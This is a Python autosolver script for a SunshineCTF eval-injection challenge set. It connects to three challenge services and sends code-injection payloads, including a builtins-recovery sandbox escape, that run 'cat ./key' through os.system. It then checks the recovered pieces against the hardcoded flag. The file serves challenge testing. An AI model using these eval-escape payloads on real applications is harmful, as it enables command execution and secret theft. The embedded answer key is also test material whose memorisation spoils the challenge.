#!/usr/local/bin/python3
import socket
import time
import sys
import getopt
import os
from datetime import datetime

sys.stdout.reconfigure(line_buffering=True)

# usage:
# when debugging locally and don't want it to repeat:
# python solver.py --localhost --no-repeat
# when debugging a real-server challenge and want it to repeat:
# python solver.py
# when debugging a real-server challenge and don't want it to repeat:
# python solver.py --no-repeat
# skip the first sleep (helps with service synchronization)
# python solver.py --skip-first-sleep
challenge_ports = [
    int(os.getenv('CHALLENGE_1_PORT', 65000)),
    int(os.getenv('CHALLENGE_2_PORT', 65001)),
    int(os.getenv('CHALLENGE_3_PORT', 65002))
]
challenge_domains = [
    'challenge-1',
    'challenge-2',
    'challenge-3'
]
repeat = True
first_sleep = True

if len(sys.argv) > 1:
    print(f"Detected arguments: {sys.argv[1:]}")
    try:
        # modified from https://www.tutorialspoint.com/python3/python_command_line_arguments.htm
        opts, args = getopt.getopt(sys.argv[1:], "lns",
                                   ["localhost", "no-repeat", "skip-first-sleep"])
        for opt, arg in opts:
            if opt == '-l' or opt == '--localhost':
                challenge_domains = ["localhost", "localhost", "localhost"]
                print("Using localhost instead of challenge servers")
            elif opt == "-n" or opt == "--no-repeat":
                repeat = False
                print("Only executing auto-solve once.")
            elif opt == "-s" or opt == "--skip-first-sleep":
                first_sleep = False
            else:
                print(f"Unknown argument {opt} passed, ignoring.")
    except getopt.GetoptError:
        print(
            "Unknown argument given. Continuing with normal DNS resolution instead."
        )

print(f"Challenge domains chosen: {challenge_domains}")
print(f"Challenge ports chosen: {challenge_ports}")

# sleep for 10 seconds for the other docker containers to start up
if first_sleep:
    print(f"Autosolver up as of {datetime.utcnow().isoformat()}Z... sleeping for 10 seconds to allow other services time to start (skip this with the --skip-first-sleep option)")
    time.sleep(10)
    print("Autosolver starting solve.")

pre_prompts = ["", "sun{eval_is\n", "_safe_\n"]
injections = [
    "exec(\"import os\\nos.system('cat ./key;echo')\")\n",
    "eval(compile(\"\"\"import os \\nos.system(\"cat ./key;echo\")\"\"\",'<string>', 'exec'))\n",
    "[c for c in [''.__class__.__class__.__subclasses__(''.__class__.__class__)[0].register.__globals__['__loader__'].get_data.__globals__['sys'].modules['builtins']] if c.exec('t.__import__(\"os\").system(\"cat ./key;echo\")',{'t':c})]\n"
]

expected = ["sun{eval_is", "_safe_", "only_if_you_ast_whitelist_first}"]
flag = "sun{eval_is_safe_only_if_you_ast_whitelist_first}"

while True:
    found_flag = ""
    for i in range(0, 3):
        # copied from https://stackoverflow.com/questions/48390709/streaming-tcp-data-to-a-client-with-python
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            ip = socket.gethostbyname(challenge_domains[i])
        except socket.gaierror:
            print(
                f"Challenge DNS servers may be down, could not resolve {challenge_domains[i]}"
            )
            exit(1)

        port = challenge_ports[i]
        address = (ip, port)

        try:
            client.connect(address)
        except ConnectionError as e:
            print(
                f"Fatal error connecting to {address}! Connection error {e}.")
            exit(1)

        # remove the intro nonsense
        intro = ""
        while (not "Give me" in intro) and (not "What was " in intro):
            intro = client.recv(80000).decode('utf-8')
        
        print(f"intro: '''{str(intro)}'''")
        # if we have a pre-key prompt, send it, otherwise don't.
        if pre_prompts[i] != "":
            print(f"sending prompt {pre_prompts[i]}")
            client.send(str.encode(pre_prompts[i]))

        # remove the other intro nonsense
        while (not "Give me" in intro):
            intro = client.recv(80000).decode('utf-8')

        # send the injection and get the key
        print(f"sending injection {injections[i]}")
        client.send(str.encode(injections[i]))
        
        key = client.recv(80000).decode('utf-8').rstrip()
        while key == "":
            key = client.recv(80000).decode('utf-8').rstrip()

        # race exists where the last recv steals all the info from the server
        key_and_other_junk = key.split()
        key = key_and_other_junk[0]

        print(f"key is '{key}'")
        if not expected[i] in key:
            print(f"ProcrastinatorProgrammer Challenge {i + 1} is down!")
            nonsense = str(client.recv(80000))
            print(nonsense)
            exit(1)
        found_flag += key.rstrip()

        # we only care about the domain and port information for the first and second challenges, the third one doesn't have anything with it.
        if i != 2:
            # get the rest of the string
            domain_and_port_prompt = ""
            result = ""
            if len(key_and_other_junk) > 1:
                result = "\n".join(key_and_other_junk[1:])
                print(f"Got more stuff from first pass: '{result}'")
            else:
                result = client.recv(80000).decode('utf-8')
            while result != None and result != "":
                print(f"Got {result}")
                domain_and_port_prompt += result
                result = client.recv(80000).decode('utf-8')
            
            if not 'challenge-' in domain_and_port_prompt and not 'sunshinectf.org' in domain_and_port_prompt:
                print("Challenge did not print out either challenge- or a domain containing sunshinectf.org")
                print(f"Instead printed '{domain_and_port_prompt}'")
                exit(1)
            print(f"Challenge printed out expected domain '{challenge_domains[i + 1]}' and expected port {challenge_ports[i + 1]}")
            
    if found_flag != flag:
        print(
            f"Error in challenge setup, key produced by challenge: {found_flag}, key expected for CTFd: {flag}"
        )
        exit(1)
    else:
        print(
            f"Verified key from challenge produces CTFd flag {found_flag} = {flag}"
        )

    if repeat:
        print(f"✔️  challenges still up as of {datetime.utcnow().isoformat()}Z... sleeping for 30 seconds...")
        time.sleep(30)
    else:
        print(f"❌  Challenges still up as of {datetime.utcnow().isoformat()}Z... exiting.")
        exit(0)
